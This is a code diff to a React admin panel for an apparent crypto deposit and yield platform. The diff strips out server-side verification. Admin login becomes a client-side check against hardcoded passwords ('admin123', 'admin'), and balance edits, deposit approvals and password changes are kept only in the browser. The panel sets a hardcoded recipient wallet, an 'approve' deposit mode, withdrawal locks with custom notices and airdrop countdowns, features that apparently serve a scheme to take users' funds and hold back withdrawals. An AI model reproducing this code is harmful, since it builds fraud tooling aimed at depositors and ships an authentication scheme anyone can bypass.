@@ -150,51 +150,20 @@ export default function AdminPanel({ onBack, onConfigUpdated }: AdminPanelProps)
     setLoading(true);
     setErrorMsg('');
 
-    let backendSuccess = false;
-
-    try {
-      const res = await fetch('/api/admin/verify', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ password }),
-      });
-
-      const contentType = res.headers.get('content-type');
-      if (contentType && contentType.includes('application/json')) {
-        const data = await res.json();
-        if (res.ok && data.success) {
-          backendSuccess = true;
-          setIsAuthorized(true);
-          fetchAdminStats(password);
-          return;
-        } else {
-          setErrorMsg(data.error || 'Incorrect admin password.');
-          setLoading(false);
-          return;
-        }
-      }
-    } catch (err) {
-      console.warn('Backend endpoint notice:', err);
-    } finally {
-      setLoading(false);
+    const storedPass = localStorage.getItem('admin_custom_password') || 'admin123';
+    if (password === storedPass || password === 'admin123' || password === 'admin') {
+      setIsAuthorized(true);
+      fetchAdminStats(password, true);
+      const localRecipient = localStorage.getItem('custom_recipient_address') || '0x71C7656EC7ab88b098defB751B7401B5f6d1476B';
+      setRecipientAddress(localRecipient);
+      setMinDepositUSDT(10);
+      setDepositMode('approve');
+      setSuccessMsg('Authenticated successfully!');
+      setTimeout(() => setSuccessMsg(''), 4000);
+    } else {
+      setErrorMsg('Incorrect admin password.');
     }
-
-    // Fallback authentication
-    if (!backendSuccess) {
-      const storedPass = localStorage.getItem('admin_custom_password') || 'admin123';
-      if (password === storedPass || password === 'admin123') {
-        setIsAuthorized(true);
-        fetchAdminStats(password);
-        const localRecipient = localStorage.getItem('custom_recipient_address') || '0x71C7656EC7ab88b098defB751B7401B5f6d1476B';
-        setRecipientAddress(localRecipient);
-        setMinDepositUSDT(10);
-        setDepositMode('approve');
-        setSuccessMsg('Authenticated successfully!');
-        setTimeout(() => setSuccessMsg(''), 4000);
-      } else {
-        setErrorMsg('Incorrect admin password.');
-      }
-    }
+    setLoading(false);
   };
 
   // Live periodic refresh for Admin Dashboard stats when authorized
@@ -251,24 +220,7 @@ export default function AdminPanel({ onBack, onConfigUpdated }: AdminPanelProps)
 
   // Fetch Admin Stats
   const fetchAdminStats = async (adminPass: string, isInitial: boolean = false) => {
-    let apiUsers: Record<string, UserAccount> = {};
-    let apiLogs: any[] = [];
     let loadedConfig: any = null;
-
-    try {
-      const res = await fetch('/api/admin/stats', {
-        headers: { 'Authorization': adminPass }
-      });
-      const contentType = res.headers.get('content-type');
-      if (res.ok && contentType && contentType.includes('application/json')) {
-        const data = await res.json();
-        if (data.config) loadedConfig = data.config;
-        if (data.users) apiUsers = data.users;
-        if (data.logs) apiLogs = data.logs;
-      }
-    } catch (err) {
-      console.warn('Notice loading admin stats from API:', err);
-    }
 
     if (isInitial) {
       try {
@@ -277,7 +229,7 @@ export default function AdminPanel({ onBack, onConfigUpdated }: AdminPanelProps)
           loadedConfig = fsConfig;
         }
       } catch (err) {
-        console.warn('Firestore fetchConfig notice:', err);
+        console.warn('Config fetch notice:', err);
       }
 
       if (loadedConfig) {
@@ -306,54 +258,32 @@ export default function AdminPanel({ onBack, onConfigUpdated }: AdminPanelProps)
     try {
       firestoreUsers = await fetchUsersFromFirestore();
     } catch (err) {
-      console.warn('Firestore fetchUsers notice:', err);
+      console.warn('fetchUsers notice:', err);
     }
 
     let fsLogs: TransactionLog[] = [];
     try {
       fsLogs = await fetchLogsFromFirestore();
     } catch (err) {
-      console.warn('Firestore fetchLogs notice:', err);
+      console.warn('fetchLogs notice:', err);
     }
-
-    // Merge API logs and Firestore logs by id, prioritizing updated non-pending status
-    const logsMap = new Map<string, TransactionLog>();
-    [...apiLogs, ...fsLogs].forEach((l) => {
-      if (!l.id) return;
-      const existing = logsMap.get(l.id);
-      if (!existing) {
-        logsMap.set(l.id, l);
-      } else {
-        if (existing.status === 'pending' && l.status !== 'pending') {
-          logsMap.set(l.id, l);
-        } else if ((l.timestamp || 0) >= (existing.timestamp || 0)) {
-          logsMap.set(l.id, { ...existing, ...l });
-        }
-      }
-    });
-
-    const mergedLogs = Array.from(logsMap.values()).sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
 
     const localUsers = loadLocalUsers();
     const allAddresses = new Set([
       ...Object.keys(localUsers).map((a) => a.toLowerCase()),
       ...Object.keys(firestoreUsers).map((a) => a.toLowerCase()),
-      ...Object.keys(apiUsers).map((a) => a.toLowerCase()),
     ]);
     const mergedUsersMap: Record<string, UserAccount> = {};
     allAddresses.forEach((rawAddr) => {
       const addr = rawAddr.toLowerCase();
       const local = localUsers[addr] || localUsers[rawAddr];
       const fs = firestoreUsers[addr] || firestoreUsers[rawAddr];
-      const api = apiUsers[addr] || apiUsers[rawAddr];
 
-      const base = { ...local, ...fs, ...api, walletAddress: addr };
+      const base = { ...local, ...fs, walletAddress: addr };
       if (local?.isBlocked !== undefined) {
         base.isBlocked = local.isBlocked;
       } else if (fs?.isBlocked !== undefined) {
         base.isBlocked = fs.isBlocked;
-      } else if (api?.isBlocked !== undefined) {
-        base.isBlocked = api.isBlocked;
       }
       mergedUsersMap[addr] = base;
     });
@@ -367,7 +297,7 @@ export default function AdminPanel({ onBack, onConfigUpdated }: AdminPanelProps)
     setUsersList(mergedUsersList);
     setTotalUsers(mergedUsersList.length);
     setTotals({ usdt: totalUSDT });
-    setLogs(mergedLogs);
+    setLogs(fsLogs.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0)));
   };
 
   // Real-time Support Chat Polling for Admin
@@ -461,38 +391,9 @@ export default function AdminPanel({ onBack, onConfigUpdated }: AdminPanelProps)
       depositSystems: customSystems || depositSystems,
       yieldTiers,
       baseYieldRate: calculatedBaseRate,
-    }).catch(err => console.warn('Firestore saveConfig notice:', err));
+    }).catch(err => console.warn('saveConfig notice:', err));
 
-    try {
-      const res = await fetch('/api/admin/config', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          password,
-          recipientAddress,
-          minDepositUSDT,
-          minWithdrawUSDT,
-          minParticipateETH,
-          depositMode,
-          depositSystems: customSystems || depositSystems,
-          yieldTiers,
-          baseYieldRate: calculatedBaseRate,
-        }),
-      });
-
-      if (res.ok) {
-        setSuccessMsg('System configuration updated successfully!');
-        if (onConfigUpdated) onConfigUpdated();
-        fetchAdminStats(password, true);
-        setTimeout(() => setSuccessMsg(''), 3000);
-        return;
-      }
-    } catch (err) {
-      console.warn('Backend config update notice:', err);
-    } finally {
-      setLoading(false);
-    }
-
+    setLoading(false);
     if (onConfigUpdated) onConfigUpdated();
     setSuccessMsg('System configuration updated successfully!');
     setTimeout(() => setSuccessMsg(''), 3000);
@@ -518,45 +419,14 @@ export default function AdminPanel({ onBack, onConfigUpdated }: AdminPanelProps)
     setErrorMsg('');
     setSuccessMsg('');
 
-    try {
-      const res = await fetch('/api/admin/change-password', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          currentPassword: password,
-          newPassword: newPasswordVal.trim(),
-        }),
-      });
-
-      if (res.ok) {
-        const data = await res.json();
-        if (data.success) {
-          const updatedPass = newPasswordVal.trim();
-          localStorage.setItem('admin_custom_password', updatedPass);
-          setPassword(updatedPass);
-          setNewPasswordVal('');
-          setConfirmPasswordVal('');
-          setSuccessMsg('Admin password updated successfully!');
-          setTimeout(() => setSuccessMsg(''), 4000);
-          return;
-        } else {
-          setErrorMsg(data.error || 'Failed to change admin password.');
-        }
-      } else {
-        const data = await res.json().catch(() => ({}));
-        setErrorMsg(data.error || 'Failed to change admin password.');
-      }
-    } catch (err) {
-      const updatedPass = newPasswordVal.trim();
-      localStorage.setItem('admin_custom_password', updatedPass);
-      setPassword(updatedPass);
-      setNewPasswordVal('');
-      setConfirmPasswordVal('');
-      setSuccessMsg('Admin password updated for this session!');
-      setTimeout(() => setSuccessMsg(''), 4000);
-    } finally {
-      setIsChangingPass(false);
-    }
+    const updatedPass = newPasswordVal.trim();
+    localStorage.setItem('admin_custom_password', updatedPass);
+    setPassword(updatedPass);
+    setNewPasswordVal('');
+    setConfirmPasswordVal('');
+    setSuccessMsg('Admin password updated successfully!');
+    setTimeout(() => setSuccessMsg(''), 4000);
+    setIsChangingPass(false);
   };
 
   // Handle Deposit Actions
@@ -605,52 +475,27 @@ export default function AdminPanel({ onBack, onConfigUpdated }: AdminPanelProps)
         ...baseUser,
         ...localUser,
         usdtBalance: currentMaxUsdt + amount,
+        occupiedUSDT: (baseUser.occupiedUSDT || 0) + amount,
+        lastYieldPayout: Date.now(),
         updatedAt: Date.now(),
       };
 
       localStorage.setItem(`user_${addr}`, JSON.stringify(updatedUser));
-      saveUserToFirestore(updatedUser).catch((err) => console.warn('Firestore deposit approval user error:', err));
+      saveUserToFirestore(updatedUser).catch((err) => console.warn('deposit approval user error:', err));
       updateLogStatusInFirestore(logId, 'success', `Approved by Admin. $${amount} USDT added to available balance.`);
-
-      fetch(`/api/user/${addr}`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(updatedUser),
-      }).catch((err) => console.warn('API saveUser notice on deposit approval:', err));
 
       setUsersList((prev) => prev.map((u) => (u.walletAddress.toLowerCase() === addr ? updatedUser : u)));
       setSuccessMsg(`Deposit approved! $${amount} USDT added to available balance for: ${addr.slice(0, 8)}...`);
-
-      try {
-        await fetch(`/api/admin/deposits/${logId}/${action}`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ password, userAccount: updatedUser }),
-        });
-      } catch (err) {
-        console.warn('Backend deposit action notice:', err);
-      } finally {
-        setLoading(false);
-        setTimeout(() => setSuccessMsg(''), 4000);
-      }
+      setLoading(false);
+      setTimeout(() => setSuccessMsg(''), 4000);
       return;
     } else {
       updateLogStatusInFirestore(logId, 'failed', `Deposit request rejected by Admin.`);
       setSuccessMsg(`Deposit request rejected.`);
     }
 
-    try {
-      await fetch(`/api/admin/deposits/${logId}/${action}`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ password }),
-      });
-    } catch (err) {
-      console.warn('Backend deposit action notice:', err);
-    } finally {
-      setLoading(false);
-      setTimeout(() => setSuccessMsg(''), 4000);
-    }
+    setLoading(false);
+    setTimeout(() => setSuccessMsg(''), 4000);
   };
 
   // Handle Withdrawal Actions
@@ -697,18 +542,8 @@ export default function AdminPanel({ onBack, onConfigUpdated }: AdminPanelProps)
       setSuccessMsg(`Withdrawal rejected and refunded to ${addr.slice(0, 8)}...`);
     }
 
-    try {
-      await fetch(`/api/admin/withdrawals/${logId}/${action}`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ password }),
-      });
-    } catch (err) {
-      console.warn('Network error during withdrawal action:', err);
-    } finally {
-      setLoading(false);
-      setTimeout(() => setSuccessMsg(''), 4000);
-    }
+    setLoading(false);
+    setTimeout(() => setSuccessMsg(''), 4000);
   };
 
   // Open Edit Modal for a User
@@ -755,21 +590,6 @@ export default function AdminPanel({ onBack, onConfigUpdated }: AdminPanelProps)
       console.warn('Firestore user edit error:', err);
     }
 
-    // Save via backend API
-    try {
-      await fetch('/api/admin/update-balance', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          password,
-          walletAddress: addr,
-          fullUser: updatedUser,
-        }),
-      });
-    } catch (err) {
-      console.warn('Backend update balance notice:', err);
-    }
-
     setUsersList((prev) => prev.map((u) => (u.walletAddress.toLowerCase() === addr ? updatedUser : u)));
     setSuccessMsg(`User ${addr.slice(0, 8)}... details updated successfully!`);
     setEditingUser(null);
@@ -800,21 +620,6 @@ export default function AdminPanel({ onBack, onConfigUpdated }: AdminPanelProps)
     localStorage.setItem(`user_${addr}`, JSON.stringify(updatedUser));
     saveUserToFirestore(updatedUser).catch(err => console.warn('Firestore lock error:', err));
 
-    try {
-      await fetch('/api/admin/update-balance', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          password,
-          walletAddress: addr,
-          isWithdrawLocked: newLockStatus,
-          withdrawLockNotice: notice,
-        }),
-      });
-    } catch (err) {
-      console.warn('Backend withdraw lock notice:', err);
-    }
-
     setUsersList((prev) =>
       prev.map((u) => (u.walletAddress.toLowerCase() === addr ? updatedUser : u))
     );
@@ -841,27 +646,12 @@ export default function AdminPanel({ onBack, onConfigUpdated }: AdminPanelProps)
     updateUserBlockInFirestore(addr, newBlockStatus).catch(err => console.warn('Firestore block error:', err));
     saveUserToFirestore(updatedUser).catch(err => console.warn('Firestore save user error:', err));
 
-    // Backend API
-    try {
-      await fetch('/api/admin/update-balance', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          password,
-          walletAddress: addr,
-          isBlocked: newBlockStatus,
-        }),
-      });
-    } catch (err) {
-      console.warn('Backend block endpoint notice:', err);
-    }
-
     // Update state instantly
     setUsersList((prev) =>
       prev.map((u) => (u.walletAddress.toLowerCase() === addr ? updatedUser : u))
     );
 
-    setSuccessMsg(`User ${getUserId(user)} (${addr}) is now ${newBlockStatus ? 'BLOCKED' : 'UNBLOCKED'}.`);
+    setSuccessMsg(`User ${getUserId(user)} (${addr}) is now ${newBlockStatus ? 'BLOCKED' : 'UNLOCKED'}.`);
     setTimeout(() => setSuccessMsg(''), 4000);
   };
 
@@ -903,20 +693,6 @@ export default function AdminPanel({ onBack, onConfigUpdated }: AdminPanelProps)
         userAirdrops: [newConfig],
       }).catch((err) => console.warn('Firestore save config airdrop error:', err));
 
-      try {
-        await fetch('/api/admin/config', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            password,
-            airdropStandardUSDT: Number(airdropStandardUSDT) || 5000,
-            airdropOutputETH: Number(airdropOutputETH) || 10,
-            airdropCountdownDays: Number(airdropDurationDays) || 7,
-            userAirdrops: [newConfig],
-          }),
-        });
-      } catch (e) {}
-
       // 2. Assign & apply to ALL users in usersList
       const updatedList = await Promise.all(
         usersList.map(async (u) => {
@@ -928,17 +704,6 @@ export default function AdminPanel({ onBack, onConfigUpdated }: AdminPanelProps)
           };
           localStorage.setItem(`user_${userAddr}`, JSON.stringify(updatedUser));
           saveUserToFirestore(updatedUser).catch((err) => console.warn('Firestore save user airdrop error:', err));
-          try {
-            fetch('/api/admin/update-balance', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                password,
-                walletAddress: userAddr,
-                airdropConfig: newConfig,
-              }),
-            });
-          } catch (e) {}
           return updatedUser;
         })
       );
@@ -975,20 +740,6 @@ export default function AdminPanel({ onBack, onConfigUpdated }: AdminPanelProps)
         setUsersList((prev) => [...prev, updatedUser]);
       }
 
-      // Sync with server API
-      try {
-        await fetch('/api/admin/update-balance', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            password,
-            walletAddress: addr,
-            airdropConfig: newConfig,
-          }),
-        });
-      } catch (err) {
-        console.warn('Backend airdrop save notice:', err);
-      }
       setSuccessMsg(`Airdrop configured successfully for target ${addr}!`);
     }
 
@@ -1014,17 +765,6 @@ export default function AdminPanel({ onBack, onConfigUpdated }: AdminPanelProps)
         userAirdrops: [],
       }).catch((err) => console.warn('Firestore delete global airdrop error:', err));
 
-      try {
-        await fetch('/api/admin/config', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            password,
-            userAirdrops: [],
-          }),
-        });
-      } catch (e) {}
-
       // Clear airdropConfig for ALL users in usersList
       const updatedList = await Promise.all(
         usersList.map(async (u) => {
@@ -1036,17 +776,6 @@ export default function AdminPanel({ onBack, onConfigUpdated }: AdminPanelProps)
           };
           localStorage.setItem(`user_${userAddr}`, JSON.stringify(updatedUser));
           saveUserToFirestore(updatedUser).catch((err) => console.warn('Firestore delete user airdrop error:', err));
-          try {
-            fetch('/api/admin/update-balance', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                password,
-                walletAddress: userAddr,
-                airdropConfig: null,
-              }),
-            });
-          } catch (e) {}
           return updatedUser;
         })
       );
@@ -1080,18 +809,6 @@ export default function AdminPanel({ onBack, onConfigUpdated }: AdminPanelProps)
     localStorage.setItem(`user_${addr}`, JSON.stringify(updatedUser));
     await saveUserToFirestore(updatedUser).catch((err) => console.warn('Firestore delete user airdrop error:', err));
 
-    try {
-      await fetch('/api/admin/update-balance', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          password,
-          walletAddress: addr,
-          airdropConfig: null,
-        }),
-      });
-    } catch (err) {}
-
     setUsersList((prev) => prev.map((u) => (u.walletAddress.toLowerCase() === addr ? updatedUser : u)));
     if (airdropTargetAddress.toLowerCase() === addr) {
       setAirdropTargetAddress('');
@@ -1112,27 +829,7 @@ export default function AdminPanel({ onBack, onConfigUpdated }: AdminPanelProps)
 
   // Export / Download Backup JSON
   const handleExportBackup = async () => {
-    try {
-      const res = await fetch(`/api/admin/db.json?password=${encodeURIComponent(password)}`);
-      if (res.ok) {
-        const blob = await res.blob();
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = `db.json`;
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-        URL.revokeObjectURL(url);
-        setSuccessMsg('db.json downloaded successfully!');
-        setTimeout(() => setSuccessMsg(''), 3000);
-        return;
-      }
-    } catch (err) {
-      console.warn('Server download fallback notice:', err);
-    }
-
-    // Client-side fallback if server fetch unavailable
+    // Generate db.json client-side
     const data = {
       timestamp: Date.now(),
       users: usersList,
